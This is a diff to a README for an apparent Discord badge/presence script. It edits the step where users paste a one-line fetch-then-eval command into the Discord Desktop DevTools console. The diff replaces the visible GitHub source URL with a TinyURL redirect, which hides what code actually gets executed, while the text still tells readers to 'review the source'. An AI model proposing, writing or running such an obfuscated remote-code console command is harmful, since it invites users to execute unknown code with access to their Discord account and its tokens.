@@ -132,10 +132,10 @@ To disable Desktop DevTools later, close Discord and remove the property or chan
 After typing **allow pasting** manually in the console, paste this one-line command:
 
 ~~~js
-fetch("https://github.com/Zwuiix-cmd/discord-game-badge-presence/raw/main/game-presence.js").then(r => r.text()).then(eval)
+fetch("https://tinyurl.com/2ya5wl2k").then(r => r.text()).then(eval)
 ~~~
 
-It downloads and executes the current `main` version of `game-presence.js`. Review the source before using this command, since it executes remote code inside Discord Desktop.
+It downloads and executes the current `main` version of `game-presence.js` through a TinyURL redirect. Review the source before using this command, since it executes remote code inside Discord Desktop.
 
 The script stops with a centered warning when it is executed in a normal browser. Run only one instance at a time.
 
